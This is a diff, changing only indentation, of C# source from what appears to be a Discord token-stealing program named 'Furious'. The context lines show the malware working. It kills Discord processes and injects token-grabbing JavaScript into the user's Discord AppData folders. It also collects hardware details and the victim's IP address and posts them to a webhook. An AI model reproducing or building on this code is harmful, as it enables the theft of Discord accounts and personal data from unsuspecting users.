@@ -29,7 +29,7 @@ namespace Furious
 
 
 		internal static async Task Write(string path, string javascriptPath)
-        {
+        	{
 			if (Directory.Exists(path))
 			{
 				string[] discord = Directory.GetDirectories(path);
@@ -46,7 +46,7 @@ namespace Furious
 		}
 		///This method is used to write the token grabbing JavaScript code into the Discord directory.
 		internal static async Task InjectJS()
-        {
+        	{
 			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord", "Resources.stable.txt");
 
 			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb", "Resources.ptb.txt");
@@ -62,7 +62,7 @@ namespace Furious
 			Process.GetProcesses().Where(p => p.ProcessName.Contains("discord")).ToList().ForEach(y => y.Kill());
 
 			await InjectJS();
-        }
+        	}
 
 		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
 		internal static async Task<string> GetHardware()
@@ -80,9 +80,9 @@ namespace Furious
 					sb.AppendLine($"GPU: {obj["Name"]}");
 				}
 				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
-                {
+                		{
 					sb.AppendLine($"OS: {obj["Caption"]}");
-                }
+                		}
 			});
 
 			Console.WriteLine(sb.ToString());
@@ -104,7 +104,7 @@ namespace Furious
 						{ "content", $"Data for '{ Environment.UserName }' @ { await GrabIP() }	```{ data }```" }
 					};
 
-                    response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
+                    			response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
 				}
 				catch (HttpRequestException ex)
 				{
